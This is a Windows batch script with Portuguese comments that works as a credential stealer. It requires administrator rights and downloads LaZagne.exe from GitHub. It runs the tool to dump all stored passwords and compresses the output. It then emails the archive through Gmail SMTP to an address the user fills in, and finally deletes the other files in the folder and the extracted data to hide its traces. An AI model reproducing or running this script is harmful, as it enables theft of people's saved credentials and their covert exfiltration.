@echo off
cd /d "%~dp0"
:: Verifica se o script está rodando como administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Por favor, execute este script COMO ADMINISTRADOR!
    pause
    exit /b
)

pip install pyinstaller pycryptodome rsa pyasn1 pyasn1-modules requests six

echo Verificando conexao com a internet...
ping -n 1 google.com >nul 2>&1
if errorlevel 1 (
    echo Sem conexao com a internet. Conecte-se e tente novamente.
    pause
    exit /b
) else (
    echo Conexao OK.
)

echo Verificando se PowerShell estah disponivel...
powershell -Command "exit" >nul 2>&1
if errorlevel 1 (
    echo PowerShell nao encontrado. Este script precisa do PowerShell.
    pause
    exit /b
) else (
    echo PowerShell encontrado.
)

echo Verificando se Compress-Archive esta disponivel...
powershell -Command "Get-Command Compress-Archive" >nul 2>&1
if errorlevel 1 (
    echo Compress-Archive nao disponivel no seu PowerShell.
    echo Atualize para PowerShell 5.0 ou superior.
    pause
    exit /b
) else (
    echo Compress-Archive disponivel.
)

echo Verificando se LaZagne.exe existe...
if not exist LaZagne.exe (
    echo LaZagne.exe nao encontrado, baixando...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe' -OutFile 'LaZagne.exe'"
    if errorlevel 1 (
        echo Falha ao baixar LaZagne.exe
        pause
        exit /b
    )
) else (
    echo LaZagne.exe encontrado.
)

echo Criando pasta dados_extraidos...
if not exist dados_extraidos mkdir dados_extraidos

echo Executando LaZagne...
LaZagne.exe all -vv -oN > dados_extraidos\lazagne_output_log.txt 2>&1
if errorlevel 1 (
    echo Falha ao executar LaZagne.exe
    pause
    exit /b
)

echo Compactando resultados...
powershell -Command "if (Test-Path dados_extraidos.zip) { Remove-Item dados_extraidos.zip }"
powershell -Command "Compress-Archive -Path dados_extraidos -DestinationPath dados_extraidos.zip"
if errorlevel 1 (
    echo Falha ao compactar arquivos
    pause
    exit /b
)

echo Enviando email...

:: Configurações do email (Comece a mecher daqui pra baixo ate o outro aviso!)
set "EmailDe=Coloque_seu_gmail@gmail.com" :: Coloque seu Gmail para enviar o Arquivo com as informações.
set "SenhaApp=Coloque_sua_senha_do_app_do_gmail" :: Coloque a Senha do App do Gmail colocado.
set "EmailPara=Coloque_seu_gmail@gmail.com" :: Coloque novamente seu gmail igual ao anterior.
set "Assunto=R2s(lt#d@s" :: Assunto do Envio
set "Corpo=000." :: Descrição do Envio
set "Anexo=dados_extraidos.zip" :: NÃO MECHER NESSE E NEM OS DAQUI EM DIANTE PARA NÃO DAR ERRO!

:: Usando powershell para enviar o email com anexo
powershell -Command ^
    "$EmailFrom = '%EmailDe%';" ^
    "$EmailTo = '%EmailPara%';" ^
    "$Subject = '%Assunto%';" ^
    "$Body = '%Corpo%';" ^
    "$Attachment = '%Anexo%';" ^
    "$SmtpServer = 'smtp.gmail.com';" ^
    "$SmtpPort = 587;" ^
    "$Username = '%EmailDe%';" ^
    "$Password = '%SenhaApp%';" ^
    "$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force;" ^
    "$Credential = New-Object System.Management.Automation.PSCredential ($Username, $SecurePassword);" ^
    "Send-MailMessage -From $EmailFrom -To $EmailTo -Subject $Subject -Body $Body -SmtpServer $SmtpServer -Port $SmtpPort -UseSsl -Credential $Credential -Attachments $Attachment"

if errorlevel 1 (
    echo Falha ao enviar email
    pause
    exit /b
)

@echo off
set arquivo_mantido="PL84y.bat"

pushd %cd%
for %%f in (*) do (
    if /I not "%%f"==%arquivo_mantido% (
        del /q "%%f"
    )
)
popd

rmdir /s /q "dados_extraidos"

echo Processo finalizado.
pause
